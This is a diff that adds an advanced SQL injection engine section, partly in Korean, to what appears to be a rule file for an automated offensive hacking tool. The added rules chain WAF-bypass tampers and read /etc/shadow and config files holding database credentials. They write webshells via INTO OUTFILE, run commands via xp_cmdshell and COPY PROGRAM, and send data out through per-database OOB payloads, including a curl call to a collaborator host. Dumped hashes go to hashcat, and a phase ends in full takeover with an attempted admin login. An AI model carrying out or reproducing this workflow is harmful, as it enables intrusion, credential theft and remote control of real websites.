@@ -508,6 +508,82 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
   3. test_coupon_abuse(endpoint, coupon_param) → ADMIN/TEST/FREE/NULL codes
   4. test_quantity_manipulation() → 0, -1, 99999, NaN, Infinity
 
+=== v2.8.0 SQLI ADVANCED ENGINE — sqlmap 초과 수준 ===
+
+[SQLI ADVANCED — bingo.tools.sqli_advanced.SqliAdvancedEngine]
+
+  TRIGGER CONDITIONS (ANY of):
+    - SQLi 의심 파라미터 발견 시 즉시 SqliAdvancedEngine 사용
+    - 기존 sqli_auto가 탐지 실패한 경우 SqliAdvancedEngine으로 재시도
+    - WAF 탐지된 경우 반드시 SqliAdvancedEngine 사용 (tamper 자동 선택)
+    - Level 3+ 테스트 필요 시 (헤더 인젝션, 쿠키 인젝션)
+
+  INITIALIZATION:
+    engine = SqliAdvancedEngine(
+        request_fn=request_fn,
+        db_type=detected_db_type,   # "mysql"/"mssql"/"postgresql"/"oracle"/"unknown"
+        waf_type=detected_waf_type, # "cloudflare"/"wapples"/"genian"/"cloudbric"/"modsecurity"/"unknown"
+        level=3,     # 기본 Level 3 (헤더까지 테스트)
+        risk=2,      # 기본 Risk 2 (OR 기반 포함, 웹쉘 쓰기 포함)
+        oob_domain="YOUR_COLLABORATOR_DOMAIN",  # OOB 있을 때
+    )
+
+  LEVEL 자동 조정:
+    버그바운티/일반 테스트  → level=2, risk=1 (안전 모드)
+    내부 모의해킹           → level=3, risk=2 (표준)
+    풀 공격 모드            → level=5, risk=3 (모든 기법)
+
+  TAMPER 자동 선택 (waf_type 기반):
+    cloudflare  → space2comment + randomcase + versionedmorekeywords + charencode
+    wapples     → korean_waf_bypass + space2comment + versionedmorekeywords
+    genian      → korean_comment_bypass + space2hash + randomcase
+    cloudbric   → korean_waf_bypass + space2mysqlblank + randomcomments
+    gnuboard    → gnuboard_bypass + space2comment + randomcase
+    unknown     → space2comment + randomcase + charencode + versionedmorekeywords
+
+  EXECUTION PIPELINE:
+    1. auto_detect_db(url, param) → DB 타입 확정
+    2. test_error_based() → 빠른 오류 기반 탐지
+    3. test_time_based()  → 시간 기반 블라인드 (오류 없을 때)
+    4. detect_union_cols() → UNION 컬럼 수 탐지
+    5. extract_db_info()  → 버전/유저/DB명 추출
+    6. try_file_read()    → LOAD_FILE 민감파일 읽기 (/etc/passwd, config.php...)
+    7. try_webshell_write() → INTO OUTFILE 웹쉘 쓰기 (risk>=2)
+    8. try_stacked_rce()  → MSSQL xp_cmdshell / PG COPY PROGRAM (risk>=2)
+    9. OOB extraction     → DNS/HTTP 외부채널 추출 (oob_domain 설정 시)
+    10. Header injection  → Cookie/Referer/User-Agent (level>=3)
+    11. extract_and_analyze_hashes() → 응답에서 해시 자동 추출 + 분류
+
+  HASH 자동 분류 (HashAnalyzer):
+    MD5(32) → hashcat -m 0
+    SHA1(40) → hashcat -m 100
+    SHA256(64) → hashcat -m 1400
+    bcrypt → hashcat -m 3200
+    MySQL(*40hex) → hashcat -m 300
+    MSSQL(0x0100...) → hashcat -m 131
+    PHPass($P$) → hashcat -m 400
+    → 크래킹 성공 시 평문 패스워드 즉시 보고
+
+  FILE READ AUTO LIST:
+    /etc/passwd, /etc/shadow, /etc/my.cnf (MySQL 설정)
+    /var/www/html/config.php (GnuBoard 설정 — DB 크리덴셜 포함!)
+    /usr/local/gnuboard5/config.php
+    wp-config.php, application/config/database.php
+
+  OOB PAYLOAD (DB별):
+    MySQL    → LOAD_FILE(CONCAT('\\\\',({sql}),'.<collaborator>\a'))
+    MSSQL    → EXEC xp_dirtree '\\'+(@data)+'.{collaborator}\a'
+    Oracle   → UTL_HTTP.REQUEST('http://'+({sql})+'.{collaborator}')
+    PG       → COPY ... TO PROGRAM 'curl http://{collaborator}/?x=...'
+
+  SECOND-ORDER INJECTION:
+    SecondOrderEngine.generate_test_payloads() → 회원가입에 페이로드 주입
+    → 마이페이지/프로필/관리자 페이지에서 트리거
+
+  POST-EXPLOIT (인젝션 성공 후 즉시):
+    → DbDumper.auto_dump() 자동 호출 (v2.7.0 연계)
+    → 웹쉘 URL → PostExploitEngine 자동 연계
+
 === v2.7.0 DB AUTO-DUMP ENGINE DECISION RULES ===
 
 [DB FULL DUMP — bingo.tools.db_dumper]
@@ -586,6 +662,12 @@ PHASE 6 (Protocol):     SmugglingScanner → CachePoisonTester → IdorScanner
 PHASE 7 (Client):       DomXssScanner → SsrfScanner
 PHASE 8 (Post-Exploit): PostExploitEngine → ReportBuilder
 PHASE 9 (DB Full Dump): DbDumper → member + admin + sensitive → CREDENTIALS 추출 → 관리자 로그인 시도
+PHASE 10 (Advanced SQLi v2.8.0):
+  → SqliAdvancedEngine 사용 (WAF 탐지 후 tamper 자동 선택)
+  → Level/Risk 자동 조정 → Error/Time/Union/Stacked/OOB 순차 시도
+  → LOAD_FILE 민감파일 읽기 → INTO OUTFILE 웹쉘 쓰기
+  → 헤더 인젝션 (Cookie/Referer/UA) → 해시 자동 추출 → hashcat 크래킹
+  → 2차 인젝션 탐지 → UDF/xp_cmdshell → DbDumper 연계 → 완전 장악
 
 === GNUBOARD5 / KOREAN CMS SPECIFIC RULES ===
 When fingerprint shows gnuboard5 / g5_ variables in page:
